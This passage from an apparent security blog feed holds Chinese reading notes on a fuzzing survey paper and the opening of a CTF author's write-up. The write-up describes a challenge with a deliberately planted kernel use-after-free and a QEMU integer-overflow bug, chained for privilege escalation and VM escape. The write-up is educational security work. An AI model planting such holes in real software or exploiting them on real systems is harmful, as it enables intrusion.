82.63%</p></blockquote><p>模糊测试也可以基于有效输入语料库合成一种上下文无关语法来生成高度结构化的输入</p><h3 id="4-6-2-Coverage-based"><a href="#4-6-2-Coverage-based" class="headerlink" title="4.6.2 Coverage-based"></a>4.6.2 Coverage-based</h3><p>基于语料库的解决方案需要对输入规则的综合覆盖，可能会不实际，此外其并没有使用内部执行状态的信息，这可能会造成较低的代码覆盖率</p><p>输入的格式指示了输入中不同字节的关系，因此基于代码覆盖，fuzzer 可以推断字节到字节的（byte-to-byte）关系来启动模糊测试</p><blockquote><p>例如 <a href="https://www.usenix.org/conference/usenixsecurity19/presentation/blazytko">GRIMOIRE</a> 使用代码覆盖来推断目标程序所需的输入格式</p></blockquote><h3 id="4-6-3-Encoding-Function"><a href="#4-6-3-Encoding-Function" class="headerlink" title="4.6.3 Encoding Function"></a>4.6.3 Encoding Function</h3><p>与上述关注于输入的方法不同，有的 fuzzer 搜索会编码输入格式的代码区域，因为这类代码与生成结构良好的（well-structured）输入相关，故 fuzzer 在编码格式前进行变异</p><p>尽管 PUTs 的源码可能没法获取，但他们所生成的结构良好的输入则不然，例如有的社区会开源一些生成高度结构化输入的工具</p><p>对 IOT 设备而言，大部分都通过配套程序来控制，因此通过定位与编码格式相关的代码，变异可以在函数的参数或是计算格式的指令上完成</p><blockquote><p>例如 <a href="https://www.ndss-symposium.org/wp-content/uploads/2018/03/NDSS2018_01A-1_Chen_Slides.pdf">IOTFuzzer</a> 便 hook 了这类函数并对其参数进行变异</p></blockquote><h2 id="4-7-Dependency-Inference"><a href="#4-7-Dependency-Inference" class="headerlink" title="4.7 Dependency Inference"></a>4.7 Dependency Inference</h2><p>格式推断主要解决语法需求，这仍可能生成有着错误数据依赖项的输入，例如在 Fig.6 中的 <code>snippet2</code> 中，在 <code>2-5</code> 出现了一个由于 <code>errf()</code> 未定义导致的错误</p><p><img src="https://s2.loli.net/2022/10/28/pZnh2GsWyLJ4d1g.png" alt="Fig. 6 Semantic error (JavaScript). "></p><p>许多应用都需要在输入中有着正确的<strong>数据依赖项</strong>（data dependency），通常由一系列语句（statement）组成，包括系统调用、对象、APIs、ABIs等</p><h3 id="4-7-1-Documents-or-Source-Code"><a href="#4-7-1-Documents-or-Source-Code" class="headerlink" title="4.7.1 Documents or Source Code"></a>4.7.1 Documents or Source Code</h3><p>序列的数据依赖项通常通过静态分析来推断，因为许多应用都有相应的文档或源码，可以据此推断数据依赖项，并在模糊测试过程中在生成输入前先生成其先决项（prerequisites）</p><p>但静态分析误报率高且会错过接口的依赖项，因此一个较好的解决方案是结合静态分析与动态分析</p><h3 id="4-7-2-Real-world-Programs"><a href="#4-7-2-Real-world-Programs" class="headerlink" title="4.7.2 Real-world Programs"></a>4.7.2 Real-world Programs</h3><p>真实世界的许多程序通过命令行来调用接口，这便包含了数据依赖项，fuzzing 可以基于这些真实世界中程序的切片程序（program slicing）生成调用接口的新程序</p><p>数据依赖项也可以通过分析执行日志（execution log）来推断，日志中明确包含接口的顺序信息（例如哪个接口先被执行），同时隐含了接口间的参数依赖项信息</p><p>为了获得这些直接与间接的信息，模糊测试在执行过程中 hook 每个接口并记录自己所需的数据</p><blockquote><p><strong>Gap 2</strong>：输入空间的减小依赖于对语法&#x2F;语义关联的输入字节的分组，分组的优点是在探索更多执行状态中提升效率，由此 fuzzing 更倾向于满足路径约束以探索被这些约束守护的更深的代码区域</p></blockquote><h1 id="0x05-AUTOMATION"><a href="#0x05-AUTOMATION" class="headerlink" title="0x05. AUTOMATION"></a>0x05. AUTOMATION</h1><p><strong>自动执行</strong>（Automatic execution）是模糊测试理论与输入空间减方法的基础，而成功的模糊测试需要：</p><ul><li><strong>自动重复地运行 PUTs</strong>。大部分 fuzzer 都能测试命令行程序，但对于硬件或多语言软件而言不行</li><li><strong>对潜在漏洞的自动指示器</strong>（automatic indicator）。当前 fuzzer 使用 crashes 作为潜在漏洞的标志，但如条件竞争一类的漏洞并不会触发 crash</li><li><strong>高速执行</strong>。在相同的时间内检验更多的测试用例，以此增加发现漏洞的机会</li></ul><h2 id="5-1-Automatic-Execution-of-PUTs"><a href="#5-1-Automatic-Execution-of-PUTs" class="headerlink" title="5.1 Automatic Execution of PUTs"></a>5.1 Automatic Execution of PUTs</h2><p>对不同应用程序的自动化模糊测试需要不同的工程努力，本节介绍几种自动化模糊测试的方法</p><h3 id="5-1-1-Command-line-Programs"><a href="#5-1-1-Command-line-Programs" class="headerlink" title="5.1.1 Command-line Programs"></a>5.1.1 Command-line Programs</h3><p>模糊测试在测试命令行程序时通过子进程运行 PUTs 并将所需选项（options）与输入喂给程序，同时在执行 PUT 时其并不会重复所有的步骤，而是克隆出子进程以略过预处理步骤</p><p><em>在整个模糊测试过程中通常仅用一个命令行选项（即所有输入都基于该选项执行），因为不同的选项代表了不同的代码覆盖，而一次全面的测试需要列举所有的选项，因此一个高效的方案便是若对于一个选项而言当前输入无效，则跳过剩余的所有选项</em></p><blockquote><p>这里论文原文说“该种方案的一个重要的观测是若一个输入对一个选项而言是无效的，则其也会对其他选项无效”，但笔者觉得这个说法有失偏颇（</p></blockquote><h3 id="5-1-2-Deep-Learning-Systems"><a href="#5-1-2-Deep-Learning-Systems" class="headerlink" title="5.1.2 Deep Learning Systems"></a>5.1.2 Deep Learning Systems</h3><p>测试深度学习系统（DLS）的过程类似于测试命令行，通过生成输入（可以是训练数据、测试数据或不同目标上的深度学习模型）测试 DLSs 以获得更好的 fitness（可以是神经元覆盖率、损失函数、运算符级覆盖率），同时除了检测缺陷以外也会检查模型的健壮性</p><h3 id="5-1-3-Operating-System-Kernels"><a href="#5-1-3-Operating-System-Kernels" class="headerlink" title="5.1.3 Operating System Kernels"></a>5.1.3 Operating System Kernels</h3><p>OS kernel 包含了许多中断与内核线程，其执行状态无法确定，由此我们使用 hypervisor（如 QEMU）来运行内核，并通过 <a href="https://zhangtong16.github.io/2019/06/05/Intel-Processor-Trace/">Intel’s Processor Trace</a> （PT）技术来获取代码覆盖；尽管这种方法能带反馈地测试不同种内核，但仍需要人工构造语法&amp;语义正确的输入</p><p>因为输入包括文件系统镜像或一系列系统调用，fuzzers 可以以更轻量级的方法进行测试：在系统调用的数据依赖项被分析&#x2F;推断出来后生成一系列系统调用并在目标内核上运行，并监测代表潜在漏洞的 system panics</p><p>另一种测试方法是通过模拟外设并生成相应输入来测试内核驱动</p><h3 id="5-1-4-Cyber-Physical-Systems"><a href="#5-1-4-Cyber-Physical-Systems" class="headerlink" title="5.1.4 Cyber-Physical Systems"></a>5.1.4 Cyber-Physical Systems</h3><p><strong>信息物理系统</strong>（Cyber-Physical Systems，CPS）包含两个紧密结合的主要成分，即<strong>计算元素</strong>（computational elements）与<strong>物理过程</strong>（physical processes）</p><p>一个被广泛使用的计算元素是 <em>可编程逻辑控制器</em> （programmable logic controller，PLC），其控制着物理过程的驱动器并从传感器中获取输入，因此在 fuzzing CPSs 时 fuzzer 可以替换掉 PLCs 并通过网络直接向驱动器发送大量的命令</p><p>PLC 的二进制文件也是 CPSs 的一个可测试点，但其有着多种二进制格式以及复杂的与物理实体间的通信；基于对 PLC 二进制文件与开发平台的分析，自动化的 fuzz 可以在其运行在 PLC 设备上时进行</p><h3 id="5-1-5-Internet-of-Things"><a href="#5-1-5-Internet-of-Things" class="headerlink" title="5.1.5 Internet of Things"></a>5.1.5 Internet of Things</h3><p>IOT 的自动化 fuzzing 包括模拟与网络级测试：</p><ul><li>模拟器可以在没有对应硬件时运行 IOT 固件，以灰盒模式测试目标程序</li><li>网络级的 fuzzing 以黑盒模式进行测试，即通过网络向 IOT 设备发送信息，以响应作为执行结果，fitness 便是类型数量</li></ul><h3 id="5-1-6-Applications-with-Graphical-User-Interface"><a href="#5-1-6-Applications-with-Graphical-User-Interface" class="headerlink" title="5.1.6 Applications with Graphical User Interface"></a>5.1.6 Applications with Graphical User Interface</h3><p>GUI 程序的执行比命令行慢得多，而执行速度是 fuzzing 的关键，因此对 GUI 程序的自动化测试通常将 GUI 替换为一种更快的方案并以命令行模式执行目标</p><blockquote><p>例如对 UI 操作建模后为安卓应用生成事件序列（event sequences）</p></blockquote><p>此外，fuzzer 也可以使用 <strong>hardness</strong> 来准备执行上下文，以直接唤醒 GUIs 中的目标函数</p><h3 id="5-1-7-Applications-with-Network"><a href="#5-1-7-Applications-with-Network" class="headerlink" title="5.1.7 Applications with Network"></a>5.1.7 Applications with Network</h3><p>智能合约、协议实现、云服务、Android Native System Services、机器人装置等通过网络接收输入，由此可以在本地生成输入后由目标应用远程执行，自动测试的效率依赖于生成输入的质量与反映执行状态的 fitness</p><h2 id="5-2-Automatic-Detection-of-Bugs"><a href="#5-2-Automatic-Detection-of-Bugs" class="headerlink" title="5.2 Automatic Detection of Bugs"></a>5.2 Automatic Detection of Bugs</h2><p>对于漏洞检测器（detector）而言漏洞的代码区域不可知，甚至不知道程序中是否存在漏洞，因此在自动 fuzzing 中记录潜在漏洞就变得十分重要，漏洞的标志（indicator）通常是程序执行时崩溃，也有一些基于漏洞模式（pattern）设计的专一而高效的指示器</p><p>本节主要介绍成功由 fuzzing 发现的六种漏洞：内存损坏、并发漏洞、算法复杂性、spectre 型漏洞、测信道、整型漏洞</p><h3 id="5-2-1-Memory-violation-Bugs"><a href="#5-2-1-Memory-violation-Bugs" class="headerlink" title="5.2.1 Memory-violation Bugs"></a>5.2.1 Memory-violation Bugs</h3><blockquote><p>这段对于打 Pwn 的同学来说都比较无聊，笔者就不细录了</p></blockquote><p><strong>内存损坏型漏洞</strong>（Memory-violation Bugs）是最古老也最严重的安全漏洞，分为两类：</p><ul><li><strong>空间安全损坏</strong>（spatial safety violation）：即非法内存访问。如 Fig.7a 便是一个越界（out-of-bound）内存访问  </li><li><strong>时间安全损坏</strong>（temporal safety violation）：即非法内存引用。如 Fig.7b 便是一个 use-after-free 漏洞</li></ul><p><img src="https://s2.loli.net/2022/10/30/nAuTKjBHO2JpeXE.png" alt="Fig. 7. Memory violation bugs"></p><p>尽管已经有一些针对内存破坏型漏洞的缓解措施（migration），但由于开销、兼容性、健壮性等原因，大部分缓解措施并未实际被使用</p><blockquote><p>例如 CTF 里打 kernel pwn 通常都要 bypass KPTI，但在真实世界的高性能场景下这一特性通常是被关闭的</p><blockquote><p>（听说在实际应用中有20%以上的性能损耗，<del>👴也不知道是不是真的</del></p></blockquote></blockquote><blockquote><p>论文给出了两个例子：</p><ul><li><a href="https://www.usenix.org/conference/usenixsecurity13/technical-sessions/papers/haller">Dowser</a> ：认为缓冲区溢出主要发生于循环中对数组的访问，通过排序循环中内存访问指令并给更高排序的输入高优先级后利用污点分析与混合执行求解选中输入的路径约束以检测 OOB 漏洞</li><li><a href="https://dl.acm.org/doi/10.1145/3377811.3380386">UAFL</a>：由于 UAF 漏洞通常是分配→释放→重用三步走，这一漏洞模式驱动 UAFL 生成能够逐渐覆盖一整列潜在 UAF 漏洞的输入，潜在 UAF 序列通过基于漏洞模式的静态类型分析完成</li></ul></blockquote><h3 id="5-2-2-Concurrency-Bugs"><a href="#5-2-2-Concurrency-Bugs" class="headerlink" title="5.2.2 Concurrency Bugs"></a>5.2.2 Concurrency Bugs</h3><p><strong>并发型漏洞</strong>（Concurrency Bugs）在程序没有合适的同步机制或运行顺序时发生，通常可以分为：</p><ul><li><strong>死锁型漏洞</strong>（deadlock bugs）：等待资源释放（如锁）</li><li><strong>非死锁型漏洞</strong>（non-deadlock bugs）<ul><li>原子性损坏型（atomicity-violation）：破坏了某一代码区域的 <em>期望序列性</em> （desired serializability），如 Fig.8a 所示的 <code>Thread 1</code> 第三行释放了 <code>p-&gt;info</code>，<code>Thread 2</code> 的第二行将 <code>p-&gt;info</code> 置为 NULL，从而引发错误</li><li>顺序型（order）漏洞：以错误的顺序对内存区域进行访问，如 Fig.8b 中 <code>Thread 2</code> 在 <code>mThd</code> 被初始化前对 <code>mState</code> 赋值，这会造成未初始化变量引用漏洞</li></ul></li></ul><blockquote><p><del>真的有人会这么写代码🐎</del></p></blockquote><p><img src="https://s2.loli.net/2022/10/30/AfHSLXUPDItFRqB.png" alt="image.png"></p><p>发现死锁漏洞的一个方法是在 <em>锁顺序图</em> （lock order graph）上检测代表死锁的环（cycles）</p><blockquote><p>论文举了这些例子：</p><ul><li><a href="https://ieeexplore.ieee.org/document/6227156/">MagicFuzzer</a>： 为了提高效率，其会移除不在任何环中的锁，并检查剩余的环</li><li><a href="https://dl.acm.org/doi/abs/10.1145/1453101.1453121">ATOMFUZZER</a>：对于原子性破坏，其会观测原子块内的锁被两个线程重复请求与释放的漏洞模式</li><li><a href="https://dl.acm.org/doi/10.1145/1321631.1321679">CalFuzzer</a>：过多的线程交错（interleaving）带来状态爆炸（state-explosion），其基于交错的等价性缓解状态爆炸</li></ul></blockquote><h3 id="5-2-3-Algorithmic-Complexity"><a href="#5-2-3-Algorithmic-Complexity" class="headerlink" title="5.2.3 Algorithmic Complexity"></a>5.2.3 Algorithmic Complexity</h3><p><strong>算法复杂性</strong>（Algorithm Complexity，AC）漏洞是算法在最坏情况下会显著的降低性能，从而可能导致拒绝服务（Denial-of-Service）攻击，Fig.9 展示了一个有着不同算法复杂度的例子，在最坏情况下可以被攻击者用作 DoS  攻击：</p><p><img src="https://s2.loli.net/2022/10/30/mYhDVBvyeSzcrix.png" alt="Fig. 9. Algorithm complexity"></p><blockquote><p>论文举了以下例子：</p><ul><li><a href="https://dl.acm.org/doi/10.1145/3133956.3134073">SlowFuzz</a>：通过生成增加执行指令数量的输入来发现 AC 漏洞</li><li><a href="https://www.ndss-symposium.org/ndss-paper/hotfuzz-discovering-algorithmic-denial-of-service-vulnerabilities-through-guided-micro-fuzzing/">HotFuzz</a>：通过最大化单个方法的消耗来检测 Java 中的 AC 漏洞</li><li><a href="https://ieeexplore.ieee.org/document/9284141/">MemLock</a>：通过边覆盖率与内存消耗来检测 AC 漏洞</li><li><a href="https://dl.acm.org/doi/10.1145/3236024.3236039">Singularity</a>：基于 <em>最坏表现输入</em> （我认识他 performance input，WPI）总是遵循某种特定模式来合成输入生成程序</li></ul></blockquote><h3 id="5-2-4-Spectre-type-Bugs"><a href="#5-2-4-Spectre-type-Bugs" class="headerlink" title="5.2.4 Spectre-type Bugs"></a>5.2.4 Spectre-type Bugs</h3><p><strong>幽灵型漏洞</strong>（Spectre-type Bugs）是一种利用错误分支预测（mispredicted branch speculations）来控制内存访问的微架构攻击，例如在 Fig.10 中攻击者可以利用有效值来训练分支预测为真，随后给变量一个 OOB 的值，此时预测器便会错误预测分支行为，从而错误地执行了第3、4行代码，造成了越界读取</p><p><img src="https://s2.loli.net/2022/10/30/LJsx8WOUQyP2koA.png" alt="Fig. 10. Spectre-type bug"></p><blockquote><p>论文给出了这个例子：<a href="https://www.usenix.org/conference/usenixsecurity20/presentation/oleksenko">SpecFuzz</a>，<del>不过在笔者看来噱头大于实际</del></p></blockquote><h3 id="5-2-5-Side-channels"><a href="#5-2-5-Side-channels" class="headerlink" title="5.2.5 Side channels"></a>5.2.5 Side channels</h3><p><strong>侧信道漏洞</strong>（side-channel）通过对系统的非功能性表现（例如执行时间）来泄露信息，例如通过分支执行时间判断执行的分支</p><blockquote><p>论文没给例子，那笔者给出一个例子：<a href="https://gruss.cc/files/prefetch.pdf">prefetch side-channel attack: bypassing SMAP and KASLR</a></p></blockquote><p><strong>JIT-induced side channels</strong>（<del>不懂咋翻</del>）是一种由即时优化（Just-In-Time Optimization）导致的特殊侧信道，类似于幽灵型漏洞，通过训练 JIT 编译器优化单一分支以使得两执行分支间执行时间差大到可以被观测到</p><h3 id="5-2-6-Integer-Bugs"><a href="#5-2-6-Integer-Bugs" class="headerlink" title="5.2.6 Integer Bugs"></a>5.2.6 Integer Bugs</h3><p><strong>整型上溢&#x2F;下溢</strong>（Integer Overflow&#x2F;Underflow）在算术表达式的值超过机器类型所决定的范围时发生，或是在整型间转换时发生（比如 int to uint）</p><blockquote><p>论文举了这个例子：<a href="https://dl.acm.org/doi/10.5555/1855768.1855773">SmartFuzz</a></p></blockquote><h2 id="5-3-Improvement-of-Execution-Speed"><a href="#5-3-Improvement-of-Execution-Speed" class="headerlink" title="5.3 Improvement of Execution Speed"></a>5.3 Improvement of Execution Speed</h2><p>执行速度对模糊测试而言非常关键，更高的执行速度意味着在同一时间能跑更多测试用例，从而提高发现缺陷的机会</p><h3 id="5-3-1-Binary-Analysis"><a href="#5-3-1-Binary-Analysis" class="headerlink" title="5.3.1 Binary Analysis"></a>5.3.1 Binary Analysis</h3><p><strong>静态插桩</strong>（static instrumentation）是主流的获取执行状态的方式，因为其为 fuzzing 提供了更高的执行速度</p><ul><li><p>对开源程序而言，一个被广泛使用的静态分析工具是 <code>LLVM</code>，其在编译期进行插桩</p></li><li><p>对于闭源程序而言，fuzzer 被限制于二进制分析，但二进制插桩工具有着不菲的运行时开销</p><blockquote><p>论文给出了这些例子：</p><ul><li><a href="https://ieeexplore.ieee.org/document/9152762">RetroWrite</a> 使用基于可重汇编的汇编（reassembleable assembly）的静态二进制重写技术，其关注于使用 64 位的 <em>地址无关代码</em> （position independent code，PIC）的重定位信息来插桩汇编程序</li><li><a href="https://www.usenix.org/conference/usenixsecurity21/presentation/nagy">FIBRE</a> 通过四个修改中间表示的阶段（IR-modifying phase）来流水线化插桩</li><li><a href="https://ieeexplore.ieee.org/document/9519407">STOCHFUZZ</a> 通过多次重写来解决此前重写的遗留问题</li></ul></blockquote></li></ul><h3 id="5-3-2-Execution-Process"><a href="#5-3-2-Execution-Process" class="headerlink" title="5.3.2 Execution Process"></a>5.3.2 Execution Process</h3><p>执行速度同样可以在模糊测试过程中提升，例如 <a href="https://ieeexplore.ieee.org/document/8835316">UnTracer</a> 观测到大部分测试用例并不会带来新的覆盖率，由此其仅追踪会增加覆盖率的测试用例</p><blockquote><p>论文还给出这些例子：</p><ul><li><a href="https://ieeexplore.ieee.org/document/9139349/">CSI-Fuzz</a> 使用边覆盖率来改进 UnTracer，因为块覆盖率丧失了执行状态信息</li><li><a href="https://ieeexplore.ieee.org/document/9286017">Zeror</a> 通过在 UnTracer  插桩与 AFL 插桩间切换来改进 UnTracer</li></ul></blockquote><p>对于混合模糊测试，混合执行被用以求解路径约束，但符号执行在表示路径约束上较慢，<a href="">QSYM</a> 通过移除一些耗时的内容（IR 翻译、快照等）来缓解性能瓶颈</p><blockquote><p>论文还给出这些例子：</p><ul><li><a href="https://dl.acm.org/doi/10.1145/3319535.3354249">Intriguer</a> 观测到 QSYM 仍求解不必要约束导致的性能评价，因此其使用符号执行由动态污点分析确认的更相关指令</li><li><a href="https://dl.acm.org/doi/10.1145/3133956.3134046">Xu</a> 发现 AFL 在并行跑 120 核时显著变慢，故其设计了新的操作原语（operating primitives）来提升执行速度</li></ul></blockquote><h3 id="5-3-3-Various-Applications"><a href="#5-3-3-Various-Applications" class="headerlink" title="5.3.3 Various Applications"></a>5.3.3 Various Applications</h3><p>模糊测试被用以检测多种目标中的缺陷，如 IoT、OS kernel、VMM 等，需要根据目标特性进行客制化</p><blockquote><p>论文给出这些例子：</p><ul><li><a href="https://www.usenix.org/conference/usenixsecurity19/presentation/zheng">FIRM-AFL</a> 通过结合用户态模拟与全系统模拟来缓解传统 IOT 固件 fuzzing 中全系统模拟带来的虚拟地址与内存访问间翻译及模拟系统调用的开销</li><li>Schumilo 设计了一种<a href="https://www.ndss-symposium.org/ndss-paper/hyper-cube-high-dimensional-hypervisor-fuzzing/">客制化 OS</a> 与<a href="https://www.usenix.org/conference/usenixsecurity21/presentation/schumilo">快速快照存储机制</a></li><li>。。。</li></ul></blockquote><blockquote><p><strong>Gap 3</strong>：对应用的自动化执行基于对其的深入理解，在设计自动记录安全缺陷的 indicators 时需要首先研究这些缺陷的特性</p></blockquote><h1 id="0x06-DIRECTIONS-OF-FUTURE-RESEARCH"><a href="#0x06-DIRECTIONS-OF-FUTURE-RESEARCH" class="headerlink" title="0x06. DIRECTIONS OF FUTURE RESEARCH"></a>0x06. DIRECTIONS OF FUTURE RESEARCH</h1><p>本节总结了 fuzzing 未来的研究方向</p><ul><li><strong>More sensitive fitness</strong>：研究人员意识到代码覆盖在发现复杂漏洞上存在局限性，因此其通过引入由分析漏洞获得的信息来改进代码覆盖。未来的工作可以是基于漏洞特性分析与检测漏洞，尤其是分析那些 fuzzing 未分析出的漏洞</li><li><strong>More sophisticated fuzzing theory</strong>：绝大部分现有的工作都致力于种子调度上，仅少部分工作关注于 fuzzing 的其他过程。对整个模糊测试过程进行数学化构建并非小事，但构建多余一个模糊测试过程是可能的，例如 Game Theory 便同时考虑了种子调度与字节调度。一个更大的图景是关于模糊测试的理论局限（例如灰盒模糊测试的局限）。另一方面，使用多种类型的 fitness 构建 fuzzing 过程是另一种创建更先进 fuzzing 理论的方式，例如未来的工作可能构建同时考虑漏洞出现与状态转移的 fuzzing 过程</li><li><strong>Sound evaluation</strong>：一部分工作关注于评估的可靠性（soundness of evaluation），但没有明确结论（§3.6），有更多的问题待我们解答：在评估语料库中该使用真实漏洞还是合成漏洞？静态测试是区分不同 fuzzing 技术的最终答案🐎？合理的 time budget 应当是？如何在没有其他可比较 fuzzer 的情况下评估特殊目标（如硬件）？</li><li><strong>Scalable input inference</strong>：若在 fuzzing 中能使用格式或数据依赖项则能显著提高 fuzzing 效率（§4.6&amp;§4.7），静态分析被广泛用于格式与数据依赖项推断，但其特定于特定程序，而推断方案的实现需要考虑不同应用的特性。动态分析关注于格式推断，仅少部分在数据依赖项推断上做了工作，而其比静态分析更可扩展（scalable）</li><li><strong>Efficient mutation operators</strong>：几乎所有 fuzzer 都在 fuzzing 中使用混合的变异器，但在 fuzzing 中并不会修改变异器（§4），一部分工作在优化变异器调度上，但没人关注于可变的变异器（§3.4）。由于变异器调度与字节调度紧密关联，可以考虑基于字节调度设计变异器。对高度结构化输入的变异器调度也值得研究</li><li><strong>More types of applications</strong>：由于应用的复杂性，fuzzing 在检测更多类型应用上有其局限，例如一部分工作探索了 fuzz CPSs 的可能性，但能力遭到了限制。由于执行速度对 fuzzing 而言很重要，因此对于难以被 fuzz 的程序而言，一个潜在的方向是提升他们的执行速度</li><li><strong>More types of bugs</strong>：fuzzing 在检测如内存破坏、并发漏洞、算法复杂性漏洞上取得良好成果（§5.2），但在检测其他类型漏洞（如权限提升或逻辑漏洞）上仍存在困难，难点在于如何设计合适的 indicator，这需要研究人员同时对 fuzzing 与目标漏洞有着深刻理解</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;模糊测试为什么是神&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="http://blog.arttnba3.cn/categories/PAPER/"/>
    
    
    <category term="信息安全" scheme="http://blog.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="FUZZ" scheme="http://blog.arttnba3.cn/tags/FUZZ/"/>
    
    <category term="论文笔记" scheme="http://blog.arttnba3.cn/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>【CTF.0x07】ByteCTF2022 byte_run 出题手记</title>
    <link href="http://blog.arttnba3.cn/2022/09/30/CTF-0X07-BYTECTF2022_BYTERUN/"/>
    <id>http://blog.arttnba3.cn/2022/09/30/CTF-0X07-BYTECTF2022_BYTERUN/</id>
    <published>2022-09-30T15:48:01.000Z</published>
    <updated>2022-11-23T18:45:06.334Z</updated>
    
    <content type="html"><![CDATA[<p>前年👴当选手的时候还有⑤⭐级的带🏨住，今年当出题人👴只能喝西北风</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>作为一名安全研究员，笔者不知道为什么进了字节跳动当开发，于是就不知道为什么又跑去帮 ByteCTF 出题了（笑）</p><p>其实这道题最初的灵感来自于 Google CTF 2021 的一道名为 “fullchain” 的题目，那是一道 chrome v8 + mojo sandbox escape + kernel primitive 的题目，<strong>一条非常完整的利用链，笔者觉得非常帅气</strong>（笑）</p><p>笔者也一直想出一道比较「完整」（full chain）的题目，不过限于自身技术水平较低的缘故再加上这一次的出题时间比较短，于是只弄好了“后端利用”的部分——「Linux kernel提权」 + 「QEMU逃逸」</p><blockquote><p>“后端利用”是笔者临时生造的词，仅在这篇文章的开头表示「拿到了远端代码执行权限之后的利用部分」（笑）</p></blockquote><ul><li>kernel 部分的灵感来自于 CVE-2022-0847，也就是“dirty pipe”，笔者模仿内核的 pipe 结构自己写了一个简化版的 pipe，并留下了一个 UAF 漏洞</li><li>QEMU 部分则主要是一个提供存储功能的“块设备”，漏洞则是非常明显的整数溢出导致的越界读写</li></ul><p>在笔者看来整体难度其实并不算太大（因为当笔者开始出这道题目的时候出题时间已经所剩无几了，那时候其实没想出啥好的点子XD），所以在其他出题人都在文档里写“难度中等”的时候只有笔者一个人写了“难度简单”，从最终的解题情况来看的话 <em>这一次整个 pwn 的出题好像都不咋能吸引大佬来做……</em></p><p>本次题目源码已经全部开源：<a href="https://github.com/arttnba3/ByteCTF2022_PWN-ByteRun">https://github.com/arttnba3/ByteCTF2022_PWN-ByteRun</a></p><h1 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01.题目分析"></a>0x01.题目分析</h1><p>u1s1，这一次编译出来的代码再反汇编之后确实比较难看，哪怕是笔者作为出题人尝试逆了一下也没能在短时间内看明白整个题目的运行逻辑（笑）</p><h2 id="一、内核模块部分"><a href="#一、内核模块部分" class="headerlink" title="一、内核模块部分"></a>一、内核模块部分</h2><p>笔者一开始就想写一个功能上比较完整的设备驱动，于是包括与设备交互那一块的代码也集成在了内核模块中，不过在这里笔者设定了驱动存在着两种运行模式：流（stream）模式和块（block）模式，其中前者是与设备无关的管道功能部分，后者则是与设备交互的部分，但是后者的功能需要 root 权限才能开启，于是第一个任务就是内核提权；）</p><p>在模块初始化函数当中为 PCI 设备进行了相应的接口注册：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">bytedev_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br>    <span class="hljs-comment">/* register pci driver */</span><br>    <span class="hljs-keyword">return</span> pci_register_driver(&amp;bytedev_driver);<br>&#125;<br></code></pre></td></tr></table></figure><p>当一个新的 bytedev 设备插进来的时候，内核便会遍历接口比对 BTF，最后调用到我们的初始化函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pci_device_id</span> <span class="hljs-title">bytedev_ids</span>[] =</span> &#123;<br>    &#123; PCI_DEVICE(PCI_VENDOR_ID_BYTEDEV, PCI_DEVICE_ID_BYTEDEV) &#125;,<br>    &#123; <span class="hljs-number">0</span>, &#125;,<br>&#125;;<br><br>MODULE_DEVICE_TABLE(pci, bytedev_ids);<br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pci_driver</span> <span class="hljs-title">bytedev_driver</span> =</span> &#123;<br>    .name       = <span class="hljs-string">&quot;bytedev&quot;</span>,<br>    .id_table   = bytedev_ids,<br>    .probe      = bytedev_pci_probe,<br>    .remove     = bytedev_pci_remove,<br>&#125;;<br></code></pre></td></tr></table></figure><p>对于每个插上来的 bytedev 类型的设备，驱动都会动态生成一个对应的结构 <code>bytedev</code>，并使用 <code>pci_request_regions()</code> 等函数进行资源的探测与占用，从而使得<strong>无法直接通过在用户态进程打开设备资源文件的方式与设备进行交互</strong>：</p><blockquote><p>其实可以通过提权后卸载内核模块的方式来重新实现直接通过设备资源文件与设备进行交互，但实际上在内核模块当中笔者早已封装好了所需要使用的接口（笑）</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span 